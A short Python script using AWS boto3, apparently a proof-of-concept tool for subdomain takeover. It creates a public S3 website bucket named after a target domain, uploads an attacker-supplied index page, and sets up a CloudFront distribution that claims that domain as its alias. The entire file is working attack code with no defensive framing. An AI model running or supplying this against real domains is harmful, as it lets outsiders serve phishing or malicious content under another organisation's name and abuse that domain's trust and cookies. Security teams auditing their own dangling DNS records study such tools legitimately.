import boto3
import argparse
import time


def create_s3_site(bucket_name, index_file):
    s3 = boto3.resource('s3')
    bucket = s3.Bucket(bucket_name)
    try:
        bucket.create(ACL='public-read')
    except:
        pass
    bucket.upload_file(index_file, "index.html", ExtraArgs={'ACL': 'public-read', 'ContentType': 'text/html'})

    config = {'IndexDocument': {'Suffix': 'index.html'}}
    bucket.Website().put(WebsiteConfiguration=config)


def setup_cloudfront(domain):
    cf = boto3.client('cloudfront')

    domain_name = '%s.s3-website-us-east-1.amazonaws.com' % domain

    config = {u'Comment': 'Takeover POC',
              u'Origins':
                {u'Items': [
                    {u'OriginPath': '',
                     u'CustomOriginConfig':
                       {u'OriginSslProtocols': {u'Items': ['TLSv1', 'TLSv1.1', 'TLSv1.2'], u'Quantity': 3},
                        u'OriginProtocolPolicy': 'http-only',
                        u'OriginReadTimeout': 30,
                        u'HTTPPort': 80,
                        u'HTTPSPort': 443,
                        u'OriginKeepaliveTimeout': 5
                        },
                     u'CustomHeaders': {u'Quantity': 0},
                     u'Id': domain,
                     u'DomainName': domain_name
                    }
                ],
                    u'Quantity': 1},
                u'Enabled': True,
              u'CallerReference': '%d' % int(time.time()),
              u'DefaultCacheBehavior':
                {
                    u'TrustedSigners': {u'Enabled': False, u'Quantity': 0},
                    u'ForwardedValues': {u'Headers': {u'Quantity': 0},
                                         u'Cookies': {u'Forward': 'none'},
                                         u'QueryStringCacheKeys': {u'Quantity': 0},
                                         u'QueryString': False},
                    u'TargetOriginId': domain,
                    u'MinTTL': 0,
                    u'ViewerProtocolPolicy': 'allow-all'},
                u'Aliases':
                {u'Items': [domain], u'Quantity': 1}
            }

    cf.create_distribution(DistributionConfig=config)


def takeover_domain(domain, index_file):
    create_s3_site(domain, index_file)
    print("created s3 site")
    setup_cloudfront(domain)
    print("finished")


def run():
    parser = argparse.ArgumentParser(description='Take over a subdoimain')
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-i', '--index')
    args = parser.parse_args()

    domain = args.domain
    index = 'index.html'

    if args.index:
        index = args.index

    takeover_domain(domain, index)

if __name__=="__main__":
    run()